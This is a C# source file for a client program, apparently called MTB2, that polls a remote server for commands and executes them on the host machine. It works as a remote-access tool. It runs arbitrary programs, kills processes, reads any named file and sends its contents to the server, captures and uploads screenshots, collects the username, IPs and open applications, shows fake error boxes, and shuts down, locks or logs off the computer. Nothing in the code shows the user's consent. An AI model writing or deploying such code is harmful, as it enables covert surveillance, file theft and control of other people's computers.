using System.Drawing;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Text.Json;
using static MTB2.Debugger;

namespace MTB2;
class Commands
{
    private const int respondRetries = 3;

    public static CommandResult GetCommands()
    {
        try
        {
            var rawCommands = WebRequest.GetPageContent(getUrl());

            if (string.IsNullOrWhiteSpace(rawCommands))
            {
                return new CommandResult { Success = false, ErrorMessage = $"Failed to get commands: {nameof(rawCommands)} is null or whitespace" };
            }

            if (rawCommands.Contains("No commands found"))
            {
                Log($"No commands found for computer_id {Program.computerId}", LogLevel.Debug);
                return new CommandResult { Success = true };
            }

            if (rawCommands.Contains("error"))
            {
                // Deserialize error message
                return HandleWebError(rawCommands);
            }

            Log($"Commands: {rawCommands}", LogLevel.Debug);

            List<CommandClass>? commands = null;

            try
            {
                commands = Newtonsoft.Json.JsonConvert.DeserializeObject<List<CommandClass>>(rawCommands);
            }
            catch (JsonException ex)
            {
                Log($"Failed to deserialize commands: {nameof(rawCommands)}: {rawCommands}", LogLevel.Error);
                Log($"Exception details: {ex}");
                // Try to deserialize with System.Text.Json
                JsonSerializerOptions jsonSerializerOptions = new()
                {
                    PropertyNameCaseInsensitive = true,
                };
                jsonSerializerOptions.Converters.Add(new DateTimeConverter());

                commands = JsonSerializer.Deserialize<List<CommandClass>>(rawCommands, jsonSerializerOptions);
                //return new CommandResult { Success = false, ErrorMessage = $"Failed to deserialize commands: {nameof(rawCommands)}: {rawCommands}" };
            }


            return commands == null || commands.Count == 0
                ? new CommandResult { Success = false, ErrorMessage = $"Failed to convert commands to CommandClass: {nameof(commands)} is null or empty" }
                : new CommandResult { Success = true, Commands = commands };
        }
        catch (System.Net.WebException ex)
        {
            Log($"Failed to get commands: {ex.Message}", LogLevel.Error);
            throw;
        }
        catch (JsonException ex)
        {
            Log($"Failed to deserialize commands: {ex.Message}", LogLevel.Error);
            throw;
        }
        catch (Exception ex)
        {
            Log($"Unexpected error when getting commands: {ex.Message}", LogLevel.Error);
            throw;
        }

        static CommandResult HandleWebError(string rawCommands)
        {
            Dictionary<string, string>? error = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(rawCommands);
            string errorMessage = error is { } && error.TryGetValue("error", out string? errorValue) ? errorValue : rawCommands;
            string responseCode = error is { } && error.TryGetValue("code", out string? codeValue) ? codeValue : "No response code found";
            var msg = $"Error when getting commands: {errorMessage}, response code: {responseCode}, Program.computerId: {Program.computerId}";
            return new CommandResult { Success = false, ErrorMessage = msg };
        }

        static string getUrl()
        {
            var computerId = Program.computerId;
            if (string.IsNullOrWhiteSpace(computerId))
            {
                Log("Computer ID is null or whitespace, using Environment.Username", LogLevel.Warning);
                computerId = Environment.UserName;
            }
            return $"{Version.versionUrl}commands/getCommands.php?computerId={computerId}";
        }
    }

    public class DateTimeConverter : System.Text.Json.Serialization.JsonConverter<DateTime>
    {
        public override DateTime Read(ref Utf8JsonReader reader, Type typeToConvert, JsonSerializerOptions options)
        {
            string? dateString = reader.GetString();
            return dateString != null
                ? DateTime.ParseExact(dateString, "yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture)
                : DateTime.MinValue;
        }

        public override void Write(Utf8JsonWriter writer, DateTime value, JsonSerializerOptions options)
        {
            writer.WriteStringValue(value.ToString("yyyy-MM-dd HH:mm:ss"));
        }
    }


    public class CommandClass
    {
        public string? Command { get; set; }
        public Dictionary<string, object>? Parameters { get; set; }
        public string? Response { get; set; }
        public string? Status { get; set; }
        public int? Id { get; set; }

        [System.Text.Json.Serialization.JsonPropertyName("computer_id")]
        public string? ComputerId { get; set; }

        [System.Text.Json.Serialization.JsonPropertyName("received_at")]
        public DateTime? ReceivedAt { get; set; }

        [System.Text.Json.Serialization.JsonConstructor]
        public CommandClass()
        {
            // This constructor is used by the JsonSerializer.
            // Don't remove this constructor, even if it appears to be unused.
        }
    }

    public class CommandResult
    {
        public List<CommandClass>? Commands { get; set; }
        public string? ErrorMessage { get; set; }
        public bool Success { get; set; }
    }

    /* Commands is a dictionary with the following required (*) and optitional (') keys:
    * command: string
    ' parameters: dictionary<string, object>
    ' response: string
    ' status: string (Enum: "pending", "completed", "delivered")
    ' id: int
    ' computerId: string
    ' ReceivedAt: DateTime (YYYY-MM-DD HH:MM:SS)
*/

    public static void HandleCommands(CommandClass command)
    {
        if (command.Command == null)
        {
            Log("Command is missing required keys (\"command\")", LogLevel.Warning);
            return;
        }

        // Execute command
        if (command.Id != null)
        {
            SwitchCommand(command.Command, command.Parameters, command.Id);
        }
        else
        {
            SwitchCommand(command.Command, command.Parameters);
        }
    }

    private static void SwitchCommand(string command, Dictionary<string, object>? parameters, int? id = null)
    {
        switch (command.ToLower())
        {
            case "message":
            case "showmessage":
            case "msg":
            case "showmsg":
            case "alert":
            case "throwerror":
                // Check if parameters is null
                if (parameters is not null)
                {
                    // Show message with parameters
                    string message = parameters.TryGetValue("message", out object? messageValue) ? messageValue?.ToString() ?? "Something went wrong (nll)" : "Something went wrong.";
                    string caption = parameters.TryGetValue("caption", out object? captionValue) ? captionValue?.ToString() ?? "Error_nll" : parameters.TryGetValue("title", out object? titleValue) ? titleValue?.ToString() ?? "Error_nll" : "Error";
                    uint type = 0;
                    if (parameters.TryGetValue("type", out object? typeValue) && typeValue is uint?)
                    {
                        type = (uint)typeValue;
                    }
                    else if (parameters.TryGetValue("buttons", out object? buttonsValue) && buttonsValue is uint?)
                    {
                        type = (uint)buttonsValue;
                    }

                    Msb.Msbox(message, caption, type);
                }
                else
                {
                    // Show standard message
                    Msb.Msbox();
                }
                break;
            case "update":
            case "updateclient":
            case "forceupdate":
            case "install":
            case "installupdate":
            case "forceinstall":
                Version.HandleUpdate(true);
                Log($"Update requested (command: {command})", LogLevel.Info);
                break;
            case "getsysteminfo":
            case "getinfo":
            case "info":
            case "systeminfo":
                // Get system info
                string info = CommandExecutor.GetSystemInfo();
                Respond(info, id, Status.completed);
                Log($"System info requested (command: {command})", LogLevel.Info);
                break;
            case "shutdown":
            case "poweroff":
            case "turnoff":
                // Shutdown computer
                Log($"Shutdown requested (command: {command})", LogLevel.Info);
                System.Diagnostics.Process.Start("shutdown", "/s /t 0");
                break;
            case "restart":
            case "reboot":
                // Restart computer
                Log($"Restart requested (command: {command})", LogLevel.Info);
                System.Diagnostics.Process.Start("shutdown", "/r /t 0");
                break;
            case "logoff":
            case "logout":
            case "signout":
                // Log off user
                Log($"Log off requested (command: {command})", LogLevel.Info);
                System.Diagnostics.Process.Start("shutdown", "/l");
                break;
            case "lock":
            case "lockscreen":
                // Lock screen
                Log($"Lock screen requested (command: {command})", LogLevel.Info);
                [DllImport("user32.dll", SetLastError = true)]
                static extern bool LockWorkStation();
                LockWorkStation();
                break;
            case "open":
            case "start":
            case "run":
                // Open program
                const string programKey = "program";
                if (parameters is not null && parameters.TryGetValue(programKey, out object? programValue))
                {
                    string program = programValue?.ToString() ?? string.Empty;
                    Log($"Open program requested (command: {command}, program: {program})", LogLevel.Info);
                    System.Diagnostics.Process.Start(program);
                }
                else
                {
                    Log($"Open program requested (command: {command}), but no program was specified -> ignoring command; respond", LogLevel.Warning);
                    Respond($"Error executing command {command}; parameters is null or does not"
                            + $"contain key \"{programKey}\"", id, Status.failed);
                }
                break;
            case "kill":
            case "end":
            case "terminate":
                // Kill process
                const string processKey = "process";
                if (parameters is not null && parameters.TryGetValue(processKey, out object? processValue))
                {
                    string process = processValue?.ToString() ?? string.Empty;
                    Log($"Kill process requested (command: {command}, process: {process})", LogLevel.Info);
                    System.Diagnostics.Process.GetProcessesByName(process).ToList().ForEach(p => p.Kill());
                }
                else
                {
                    Log($"Kill process requested (command: {command}), but no process was specified -> ignoring command; respond", LogLevel.Warning);
                    Respond($"Error executing command {command}; parameters is null or does not"
                            + $"contain key \"{processKey}\"", id, Status.failed);
                }
                break;
            case "getfile":
            case "uploadfile":
            case "upload":
                // Get file from pc to server
                const string fileKey = "file";
                if (parameters is not null && parameters.TryGetValue(fileKey, out object? fileValue))
                {
                    string file = fileValue?.ToString() ?? throw new ArgumentNullException(nameof(parameters), "No file specified");
                    Log($"Get file requested (command: {command}, file: {file})", LogLevel.Info);
                    string fileContent = File.ReadAllText(file);
                    Respond(fileContent, id, Status.completed);
                }
                else
                {
                    Log($"Get file requested (command: {command}), but no file was specified -> ignoring command; respond", LogLevel.Warning);
                    Respond($"Error executing command {command}; parameters is null or does not"
                            + $"contain key \"{fileKey}\"", id, Status.failed);
                }
                break;
            case "screenshot":
            case "screen":
            case "takescreen":
            case "takescreenshot":
                // Take screenshot
                string screenshotName = $"Screen_{Program.computerId}_{DateTime.Now:yyyyMMdd_HHmmss}.png";
                string screenDirPath = Path.Combine(Version.programDir, "data", "screens");
                string screenPath = Path.Combine(screenDirPath, screenshotName);
                string stringToResponse = CommandExecutor.CaptureScreen(screenDirPath, screenshotName);
                // Check if screen capture was successful
                if (stringToResponse.Contains("Screenshot saved to"))
                {
                    Log($"Screenshot requested (command: {command})", LogLevel.Info);
                    //Respond(stringToResponse, id, Status.completed);
                }
                else
                {
                    Log($"Failed to take screenshot: {stringToResponse}", LogLevel.Error);
                    Respond(stringToResponse, id, Status.failed);
                    return;
                }

                // Get image size in bytes
                FileInfo fileInfo = new(screenPath);
                long fileSize = fileInfo.Length;

                // Get image size in KB
                double fileSizeKB = fileSize / 1024;

                // Get image size in MB
                float fileSizeMB = (float)fileSizeKB / 1024;

                // Check if filesize is bigger than 10 MB
                if (fileSize >= 10 * 1024 * 1024)
                {
                    // Respond error to server
                    string errorMessage = $"Error executing command {command}; screenshot size is larger than 10MB";
                    Log(errorMessage, LogLevel.Warning);
                    Respond(errorMessage, id, Status.failed);
                    return;
                }

                bool uploadSuccess = WebRequest.UploadFile(screenPath);

                // Respond to server
                if (!uploadSuccess)
                {
                    Log($"Failed to upload screenshot (command: {command}, filename: {screenshotName}, size: {fileSizeMB:0.00} MB)", LogLevel.Error);
                    Respond($"Failed to upload screenshot; size: {fileSizeMB:0.00} MB", id, Status.failed);
                }
                else
                {
                    Log($"Screenshot uploaded successfully (command: {command}, filename: {screenshotName}, size: {fileSizeMB:0.00} MB)", LogLevel.Info);
                    Respond($"Screenshot uploaded successfully; screenshot name: {screenshotName}, size: {fileSizeMB:0.00} MB", id, Status.completed);
                }
                break;
            case "shownotification":
            case "notification":
            case "notify":
                // Show notification
                const string titleKey = "title";
                const string textKey = "text";
                if (parameters is not null)
                {
                    string messagePlaceholder = "Notification";
                    string title = parameters.TryGetValue(titleKey, out object? titleValue) ? titleValue?.ToString() ?? messagePlaceholder : messagePlaceholder;
                    if (parameters.TryGetValue(textKey, out object? textValue))
                    {
                        string text = textValue?.ToString() ?? "Hello";
                        Log($"Show notification requested (command: {command}, title: {title}, text: {text})", LogLevel.Info);
                        Msb.ShowNotification(text, title);
                        Respond($"Notification showed successfully (command: {command}, title: {title}, text: {text})", id, Status.completed);
                    }
                    else
                    {
                        Log($"Show notification requested (command: {command}), but no text was specified -> ignoring command; respond", LogLevel.Warning);
                        Respond($"Error executing command {command}; parameters does not contain key \"{textKey}\"", id, Status.failed);
                        break;
                    }
                }
                else
                {
                    Log($"Show notification requested (command: {command}), but parameters is null -> ignoring command; respond", LogLevel.Warning);
                    Respond($"Error executing command {command}; parameters is null", id, Status.failed);
                    break;
                }
                break;
            case "remove":
            case "delete":
            case "uninstall":
                // Uninstall self
                Log($"Uninstall requested (command: {command})", LogLevel.Info);
                Version.Uninstall();
                break;
            default:
                Log($"Unknown command received: {command}", LogLevel.Warning);
                //Msb.Msbox($"Unknown command received: {command}", "MTB2Error", 0x40);
                Respond($"Error executing command; unknown command received: {command}", id, Status.failed);
                break;
        }
    }

    public enum Status
    {
        pending,
        completed,
        delivered,
        failed,
        removing
    }

    private static bool Respond(string response, int? id, Status? newStatus = null, int retry = 0)
    {
        // return if id == null
        if (id == null)
        {
            Log("Cannot respond to server when id is not specified", LogLevel.Warning);
            return false;
        }

        // Respond to server
        string respondUrl = $"{Version.versionUrl}commands/respond.php";
        string urlEncodedResponse = System.Web.HttpUtility.UrlEncode(response);
        string data = $"id={id}&response={urlEncodedResponse}";
        if (newStatus != null)
            data += $"&status={newStatus}";
        string url = $"{respondUrl}?{data}";
        string responseString = WebRequest.GetPageContent(url);

        string lowerResponse = responseString.ToLower();

        // Check if responseString contains "error" or "success"
        if (lowerResponse.Contains("error") || lowerResponse.Contains("failed") || lowerResponse.Contains("success = false"))
        {
            // Try again
            if (retry < respondRetries)
            {
                Log($"Failed to respond to server, retrying (retry {retry + 1})", LogLevel.Debug);
                return Respond(response, id, newStatus, retry + 1);
            }
            Log($"Failed to respond to server: {responseString}", LogLevel.Error);
            return false;
        }
        else if (lowerResponse.Contains("success"))
        {
            Log($"Successfully responded to server: {responseString}", LogLevel.Debug);
            return true;
        }
        else
        {
            Log($"Unexpected response when responding to server: {responseString}", LogLevel.Warning);
            return false;
        }
    }
}





class CommandExecutor
{
    public static string CaptureScreen(string screenshotDirPath, string screenshotName)
    {
        try
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                Log("Cannot take screenshot on non-Windows platform", LogLevel.Warning);
                return "Cannot take screenshot on non-Windows platform";
            }
            // Check if Windows version is compatible
            if (Environment.OSVersion.Version.Major < 6 ||
                (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor < 1))
            {
                Log("Cannot take screenshot on Windows version lower than 6.1 (Windows 7)", LogLevel.Warning);
                return "Cannot take screenshot on Windows version lower than 6.1 (Windows 7)";
            }

            string screenshotPath = Path.Combine(screenshotDirPath, screenshotName);
            Directory.CreateDirectory(screenshotDirPath);

            // Get the dimensions of the virtual screen, which includes all monitors.
#pragma warning disable CA1416
            Rectangle bounds = System.Windows.Forms.SystemInformation.VirtualScreen;
            using Bitmap screenshot = new(bounds.Width, bounds.Height);
            using Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
            screenshot.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);
#pragma warning restore CA1416

            return $"Screenshot saved to {screenshotPath}";
        }
        catch (Exception ex)
        {
            Log($"Failed to take screenshot: {ex.Message}", LogLevel.Error);
            return $"Failed to take screenshot: {ex.Message}";
        }
    }


    public static string GetSystemInfo()
    {
        // Get current open applications
        var openProcesses = System.Diagnostics.Process.GetProcesses().Where(p => !string.IsNullOrEmpty(p.MainWindowTitle)).Select(p => p.ProcessName);

        // Get all local ips
        string? myIP = null;
        string hostName = System.Net.Dns.GetHostName(); // Retrieve the Name of HOST
        System.Net.IPAddress[] myIPs = System.Net.Dns.GetHostEntry(hostName).AddressList;

        foreach (var ip in myIPs)
        {
            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            {
                myIP += ip.ToString() + ", ";
            }
        }

        // Get public ip by visiting checkip.amazonaws.com, using HttpClient
        HttpClient client = new();
        string publicIp = client.GetStringAsync("https://checkip.amazonaws.com").Result.Trim();

        string info = "System info:<br/><br/>\n\n";
        info += $"Computer ID: {Program.computerId}<br/>\n";
        info += $"MTB2 version: {Version.versionString}<br/>\n";
        info += $"Computer name: {Environment.MachineName}<br/>\n";
        info += $"Username: {Environment.UserName}<br/>\n";
        info += $"Current local ips (IPv4): {myIP}<br/>\n";
        info += $"Public ip: {publicIp}<br/>\n";
        info += $"OS version: {Environment.OSVersion.VersionString}<br/>\n";
        info += $"OS: {Environment.OSVersion}<br/>\n";
        info += $"Processor count: {Environment.ProcessorCount}<br/>\n";
        info += $"Current directory: {Environment.CurrentDirectory}<br/>\n";
        info += $"Current open applications: {string.Join(", ", openProcesses)}<br/>\n";
        info += $"Time: {DateTime.Now}<br/>\n";
        return info;
    }
}